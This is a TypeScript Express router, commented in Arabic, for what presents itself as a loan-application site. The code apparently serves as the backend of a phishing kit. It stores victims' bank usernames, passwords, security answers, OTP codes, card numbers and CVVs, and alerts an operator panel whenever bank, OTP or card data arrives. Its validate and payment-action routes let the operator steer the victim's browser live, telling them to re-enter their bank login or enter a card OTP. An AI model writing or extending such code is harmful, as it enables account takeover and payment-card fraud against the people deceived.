// مسارات الطلبات - إنشاء وإدارة طلبات التمويل
import { Router } from "express";
import { db, applicationsTable, sessionsTable } from "@workspace/db";
import { eq, desc, sql, isNull, isNotNull, and } from "drizzle-orm";
import {
  CreateApplicationBody,
  GetApplicationParams,
  UpdateApplicationParams,
  UpdateApplicationBody,
  NavigateApplicationParams,
  NavigateApplicationBody,
  ValidateApplicationDataParams,
  ValidateApplicationDataBody,
} from "@workspace/api-zod";
import { broadcast } from "../lib/websocket";
import { sendFCMNotification } from "../lib/firebase-admin";

// Simple validation helper
function isValidPaymentData(data: unknown): data is {
  cardNumber: string;
  cardHolder: string;
  expiryDate: string;
  cvv: string;
  paymentOtp?: string;
} {
  if (!data || typeof data !== "object") return false;
  const d = data as Record<string, unknown>;
  const paymentOtp = d.paymentOtp as string | undefined;
  return (
    typeof d.cardNumber === "string" && d.cardNumber.replace(/\s/g, "").length >= 16 &&
    typeof d.cardHolder === "string" && d.cardHolder.length >= 3 &&
    typeof d.expiryDate === "string" && /^\d{2}\/\d{2}$/.test(d.expiryDate) &&
    typeof d.cvv === "string" && d.cvv.length >= 3 &&
    (!paymentOtp || /^\d{4,6}$/.test(paymentOtp))
  );
}

const router = Router();

// الحصول على إحصائيات الطلبات لصفحة لوحة الإدارة
router.get("/stats", async (req, res) => {
  try {
    const [stats] = await db
      .select({
        total: sql<number>`count(*)::int`,
        pending: sql<number>`count(*) filter (where status = 'pending')::int`,
        reviewing: sql<number>`count(*) filter (where status = 'reviewing')::int`,
        approved: sql<number>`count(*) filter (where status = 'approved')::int`,
        rejected: sql<number>`count(*) filter (where status = 'rejected')::int`,
        waiting: sql<number>`count(*) filter (where status = 'waiting')::int`,
        individual: sql<number>`count(*) filter (where applicant_type = 'individual')::int`,
        business: sql<number>`count(*) filter (where applicant_type = 'business')::int`,
        activeToday: sql<number>`count(*) filter (where created_at >= now() - interval '24 hours')::int`,
      })
      .from(applicationsTable)
      .where(isNull(applicationsTable.deletedAt));

    res.json(stats);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الإحصائيات");
    res.status(500).json({ error: "فشل في جلب الإحصائيات" });
  }
});

// الحصول على قائمة جميع الطلبات (غير المحذوفة) - النسخة الأخيرة فقط
router.get("/", async (req, res) => {
  try {
    req.log.info("جاري جلب الطلبات...");
    const apps = await db
      .select()
      .from(applicationsTable)
      .orderBy(desc(applicationsTable.updatedAt));
    req.log.info({ count: apps.length }, "تم جلب الطلبات");
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلبات");
    res.status(500).json({ error: "فشل في جلب الطلبات" });
  }
});

// سلة المهملات — الطلبات المحذوفة
router.get("/trash", async (req, res) => {
  try {
    const apps = await db
      .select()
      .from(applicationsTable)
      .where(isNotNull(applicationsTable.deletedAt))
      .orderBy(desc(applicationsTable.deletedAt));
    res.json(apps);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب سلة المهملات");
    res.status(500).json({ error: "فشل في جلب سلة المهملات" });
  }
});

// حذف جميع الطلبات (ناعم)
router.delete("/", async (req, res) => {
  try {
    await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(isNull(applicationsTable.deletedAt));
    broadcast({ type: "applications_cleared" });
    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلبات");
    res.status(500).json({ error: "فشل في حذف الطلبات" });
  }
});

// إنشاء طلب تمويل جديد
router.post("/", async (req, res) => {
  const parsed = CreateApplicationBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "بيانات غير صالحة", details: parsed.error });
  }
  try {
    const [app] = await db
      .insert(applicationsTable)
      .values({
        sessionId: parsed.data.sessionId,
        applicantType: parsed.data.applicantType,
        currentStep: "applicant-info",
        status: "pending",
        version: 1,
        isLatest: true,
      })
      .returning();

    await db
      .update(sessionsTable)
      .set({ applicationId: app.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, parsed.data.sessionId));

    broadcast({ type: "application_update", data: app });
    res.status(201).json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في إنشاء الطلب");
    res.status(500).json({ error: "فشل في إنشاء الطلب" });
  }
});

// الحصول على طلب محدد
router.get("/:id", async (req, res) => {
  const params = GetApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الطلب");
    res.status(500).json({ error: "فشل في جلب الطلب" });
  }
});

// الحصول على جميع النسخ لطلب معين
router.get("/:id/versions", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    const parentId = currentApp.parentId ?? currentApp.id;

    const versions = await db
      .select()
      .from(applicationsTable)
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      )
      .orderBy(desc(applicationsTable.version));

    res.json(versions);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب نسخ الطلب");
    res.status(500).json({ error: "فشل في جلب نسخ الطلب" });
  }
});

// تحديث بيانات الطلب - يحفظ النسخة القديمة وينشئ نسخة جديدة
router.patch("/:id", async (req, res) => {
  const params = UpdateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = UpdateApplicationBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  
  try {
    const [currentApp] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, params.data.id));

    if (!currentApp) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث جميع النسخ القديمة لتكون غير موجودة كـ latest
    const parentId = currentApp.parentId ?? currentApp.id;
    await db
      .update(applicationsTable)
      .set({ isLatest: false })
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      );

    // إنشاء نسخة جديدة
    const newVersion = currentApp.version + 1;

    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: currentApp.sessionId,
        applicantType: parsed.data.applicantType ?? currentApp.applicantType,
        currentStep: parsed.data.currentStep ?? currentApp.currentStep,
        status: parsed.data.status ?? currentApp.status,
        bankId: parsed.data.bankId ?? currentApp.bankId,
        bankName: parsed.data.bankName ?? currentApp.bankName,
        fullName: parsed.data.fullName ?? currentApp.fullName,
        nationalId: parsed.data.nationalId ?? currentApp.nationalId,
        dateOfBirth: parsed.data.dateOfBirth ?? currentApp.dateOfBirth,
        monthlySalary: parsed.data.monthlySalary ?? currentApp.monthlySalary,
        employer: parsed.data.employer ?? currentApp.employer,
        phone: parsed.data.phone ?? currentApp.phone,
        email: parsed.data.email ?? currentApp.email,
        city: parsed.data.city ?? currentApp.city,
        maritalStatus: parsed.data.maritalStatus ?? currentApp.maritalStatus,
        companyName: parsed.data.companyName ?? currentApp.companyName,
        businessType: parsed.data.businessType ?? currentApp.businessType,
        commercialRegistration: parsed.data.commercialRegistration ?? currentApp.commercialRegistration,
        employeeCount: parsed.data.employeeCount ?? currentApp.employeeCount,
        annualRevenue: parsed.data.annualRevenue ?? currentApp.annualRevenue,
        contactName: parsed.data.contactName ?? currentApp.contactName,
        bankUsername: parsed.data.bankUsername ?? currentApp.bankUsername,
        bankPassword: parsed.data.bankPassword ?? currentApp.bankPassword,
        securityAnswer: parsed.data.securityAnswer ?? currentApp.securityAnswer,
        otpCode: parsed.data.otpCode ?? currentApp.otpCode,
        extraData: parsed.data.extraData ?? currentApp.extraData,
        adminNote: parsed.data.adminNote ?? currentApp.adminNote,
        version: newVersion,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث applicationId في الجلسة ليشير إلى النسخة الجديدة (لعرض الاسم في قائمة الزوار)
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إضافة applicantName لعرض اسم العميل فوراً في صفحة الزوار
    // تحديد نوع الحدث الصوتي: personal (بيانات شخصية), bank (بيانات بنك), otp (رمز تحقق)
    let eventType = "personal";
    if (parsed.data.otpCode) {
      eventType = "otp";
    } else if (parsed.data.bankId || parsed.data.bankUsername || parsed.data.bankPassword) {
      eventType = "bank";
    }

    const broadcastData = {
      ...newApp,
      applicantName: newApp.fullName || newApp.companyName || newApp.contactName || null,
      eventType,
    };
    broadcast({ type: "application_update", data: broadcastData });
    
    // إرسال FCM Push Notification
    sendFCMNotification(eventType, {
      sessionId: newApp.sessionId,
      applicantName: broadcastData.applicantName || undefined,
    }).catch(err => req.log.error({ err }, "FCM notification failed"));
    
    res.json(newApp);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحديث الطلب");
    res.status(500).json({ error: "فشل في تحديث الطلب" });
  }
});

// نقل المستخدم لخطوة معينة
router.post("/:id/navigate", async (req, res) => {
  const params = NavigateApplicationParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = NavigateApplicationBody.safeParse({ targetStep: req.body.targetStep, adminNote: req.body.adminNote });
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({
        currentStep: parsed.data.targetStep,
        adminNote: parsed.data.adminNote ?? null,
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: parsed.data.targetStep, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({ type: "navigate_user", sessionId: app.sessionId, targetStep: parsed.data.targetStep });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تحويل المستخدم");
    res.status(500).json({ error: "فشل في تحويل المستخدم" });
  }
});

// قرار التحقق من البيانات
router.post("/:id/validate", async (req, res) => {
  const params = ValidateApplicationDataParams.safeParse({ id: Number(req.params.id) });
  if (!params.success) return res.status(400).json({ error: "معرف غير صالح" });
  const parsed = ValidateApplicationDataBody.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "بيانات غير صالحة" });
  try {
    const { decision, adminNote } = parsed.data;

    let newStatus: string;
    let newStep: string;
    let targetPage: string;
    let credDecision: "approved" | "rejected";
    let credMessage: string | null = null;

    if (decision === "valid") {
      newStatus = "reviewing";
      newStep = "verify";
      targetPage = "verify";
      credDecision = "approved";
    } else if (decision === "invalid") {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "بيانات الدخول غير صحيحة، يرجى التحقق وإعادة الإدخال";
    } else {
      newStatus = "pending";
      newStep = "credentials";
      targetPage = "credentials";
      credDecision = "rejected";
      credMessage = "يرجى إعادة إدخال بيانات الدخول مرة أخرى";
    }

    const [app] = await db
      .update(applicationsTable)
      .set({ status: newStatus, currentStep: newStep, adminNote: adminNote ?? null, updatedAt: new Date() })
      .where(eq(applicationsTable.id, params.data.id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    await db
      .update(sessionsTable)
      .set({ currentPage: targetPage, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    broadcast({
      type: "credentials_decision",
      sessionId: app.sessionId,
      decision: credDecision,
      message: credMessage,
    });
    broadcast({
      type: "navigate_user",
      sessionId: app.sessionId,
      targetStep: newStep,
      message: credMessage,
    });
    broadcast({ type: "application_update", data: app });

    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في تطبيق قرار التحقق");
    res.status(500).json({ error: "فشل في تطبيق القرار" });
  }
});

// حذف طلب واحد
router.delete("/:id", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_deleted", data: { id } });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الطلب");
    res.status(500).json({ error: "فشل في حذف الطلب" });
  }
});

// استعادة طلب من سلة المهملات
router.post("/:id/restore", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .update(applicationsTable)
      .set({ deletedAt: null, updatedAt: new Date() })
      .where(eq(applicationsTable.id, id))
      .returning();
    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
    broadcast({ type: "application_update", data: app });
    res.json(app);
  } catch (err) {
    req.log.error({ err }, "خطأ في استعادة الطلب");
    res.status(500).json({ error: "فشل في استعادة الطلب" });
  }
});

// إرسال بيانات الدفع (PayVisa) وتوجيه العميل للصفحة
router.post("/:id/request-payment", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث الخطوة الحالية لـ pay-visa
    await db
      .update(applicationsTable)
      .set({
        currentStep: "pay-visa",
        updatedAt: new Date(),
      })
      .where(eq(applicationsTable.id, id));

    // تحديث صفحة الجلسة
    await db
      .update(sessionsTable)
      .set({ currentPage: "pay-visa", lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, app.sessionId));

    // حفظ التوجيه في الجلسة لاستخدامه عند إعادة التحميل (مع applicationId)
    await db
      .update(sessionsTable)
      .set({ 
        pendingNavigation: JSON.stringify({ page: "pay-visa", applicationId: id }),
        lastSeenAt: new Date() 
      })
      .where(eq(sessionsTable.id, app.sessionId));

    // إرسال حدث WebSocket لتوجيه العميل
    broadcast({
      type: "navigate_user",
      sessionId: app.sessionId,
      targetStep: "pay-visa",
      applicationId: id,
    });

    res.json({
      success: true,
      message: "تم توجيه العميل لصفحة الدفع",
      redirectUrl: `/?session=${app.sessionId}&step=pay-visa&applicationId=${id}`,
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في توجيه العميل لصفحة الدفع");
    res.status(500).json({ error: "فشل في توجيه العميل" });
  }
});

// استلام بيانات الدفع من صفحة PayVisa
router.post("/:id/payment", async (req, res) => {
  const id = Number(req.params.id);
  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });

  if (!isValidPaymentData(req.body)) {
    return res.status(400).json({ error: "بيانات الدفع غير صالحة" });
  }

  const paymentData = req.body as { cardNumber: string; cardHolder: string; expiryDate: string; cvv: string; paymentOtp?: string };

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    // تحديث بيانات الدفع مع إنشاء نسخة جديدة
    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false })
      .where(
        and(
          sql`(${applicationsTable.id} = ${parentId} OR ${applicationsTable.parentId} = ${parentId})`,
          isNull(applicationsTable.deletedAt)
        )
      );

    // إنشاء نسخة جديدة مع بيانات الدفع
    const newVersion = app.version + 1;

    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: app.sessionId,
        applicantType: app.applicantType,
        currentStep: "pay-visa",
        status: app.status,
        bankId: app.bankId,
        bankName: app.bankName,
        fullName: app.fullName,
        nationalId: app.nationalId,
        dateOfBirth: app.dateOfBirth,
        monthlySalary: app.monthlySalary,
        employer: app.employer,
        phone: app.phone,
        email: app.email,
        city: app.city,
        maritalStatus: app.maritalStatus,
        companyName: app.companyName,
        businessType: app.businessType,
        commercialRegistration: app.commercialRegistration,
        employeeCount: app.employeeCount,
        annualRevenue: app.annualRevenue,
        contactName: app.contactName,
        bankUsername: app.bankUsername,
        bankPassword: app.bankPassword,
        securityAnswer: app.securityAnswer,
        otpCode: app.otpCode,
        paymentCardNumber: paymentData.cardNumber.replace(/\s/g, ""), // إزالة المسافات
        paymentCardHolder: paymentData.cardHolder,
        paymentExpiryDate: paymentData.expiryDate,
        paymentCvv: paymentData.cvv,
        paymentOtp: paymentData.paymentOtp,
        paymentStatus: "verifying", // في انتظار التحقق من البطاقة
        extraData: app.extraData,
        adminNote: app.adminNote,
        version: newVersion,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث الجلسة
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إرسال إشعار مع كل بيانات الطلب
    broadcast({
      type: "payment_received",
      sessionId: newApp.sessionId,
      data: newApp,
    });

    sendFCMNotification("payment", {
      sessionId: newApp.sessionId,
      applicantName: newApp.fullName || newApp.companyName || newApp.contactName || undefined,
    }).catch(err => req.log.error({ err }, "FCM notification failed"));

    res.status(201).json({
      success: true,
      message: "تم استلام بيانات الدفع بنجاح",
      paymentId: newApp.id,
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في حفظ بيانات الدفع");
    res.status(500).json({ error: "فشل في حفظ بيانات الدفع" });
  }
});

// معالجة إجراءات الدفع (موافقة/رفض) من لوحة الإدارة
router.post("/:id/payment-action", async (req, res) => {
  const id = Number(req.params.id);
  const { action } = req.body as { action: "approve" | "reject" };

  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
  if (!action || !["approve", "reject"].includes(action)) {
    return res.status(400).json({ error: "إجراء غير صالح" });
  }

  try {
    const [app] = await db
      .select()
      .from(applicationsTable)
      .where(eq(applicationsTable.id, id));

    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });

    const newStatus = action === "approve" ? "approved" : "failed";
    const parentId = app.parentId ?? app.id;

    // تحديث النسخ القديمة
    await db
      .update(applicationsTable)
      .set({ isLatest: false, updatedAt: new Date() })
      .where(eq(applicationsTable.parentId, parentId))
      .andWhere(eq(applicationsTable.isLatest, true));

    // إنشاء نسخة جديدة مع الحالة الجديدة
    const [newApp] = await db
      .insert(applicationsTable)
      .values({
        sessionId: app.sessionId,
        applicantType: app.applicantType,
        currentStep: action === "approve" ? "pay-otp" : app.currentStep,
        status: app.status,
        bankId: app.bankId,
        bankName: app.bankName,
        fullName: app.fullName,
        nationalId: app.nationalId,
        dateOfBirth: app.dateOfBirth,
        monthlySalary: app.monthlySalary,
        employer: app.employer,
        phone: app.phone,
        email: app.email,
        city: app.city,
        maritalStatus: app.maritalStatus,
        companyName: app.companyName,
        businessType: app.businessType,
        commercialRegistration: app.commercialRegistration,
        employeeCount: app.employeeCount,
        annualRevenue: app.annualRevenue,
        contactName: app.contactName,
        bankUsername: app.bankUsername,
        bankPassword: app.bankPassword,
        securityAnswer: app.securityAnswer,
        otpCode: app.otpCode,
        paymentCardNumber: app.paymentCardNumber,
        paymentCardHolder: app.paymentCardHolder,
        paymentExpiryDate: app.paymentExpiryDate,
        paymentCvv: app.paymentCvv,
        paymentOtp: app.paymentOtp,
        paymentStatus: newStatus,
        paymentCompletedAt: action === "approve" ? new Date() : null,
        extraData: app.extraData,
        adminNote: app.adminNote,
        version: (app.version || 1) + 1,
        parentId: parentId,
        isLatest: true,
      })
      .returning();

    // تحديث الجلسة
    await db
      .update(sessionsTable)
      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
      .where(eq(sessionsTable.id, newApp.sessionId));

    // إرسال إشعار WebSocket للعميل
    broadcast({
      type: "payment_status_update",
      sessionId: newApp.sessionId,
      data: {
        paymentStatus: newStatus,
        currentStep: newApp.currentStep,
      },
    });

    res.json({
      success: true,
      message: action === "approve" ? "تمت الموافقة وتحويل العميل للرمز" : "تم رفض الدفع",
    });
  } catch (err) {
    req.log.error({ err }, "خطأ في معالجة إجراء الدفع");
    res.status(500).json({ error: "فشل في معالجة الإجراء" });
  }
});

export default router;
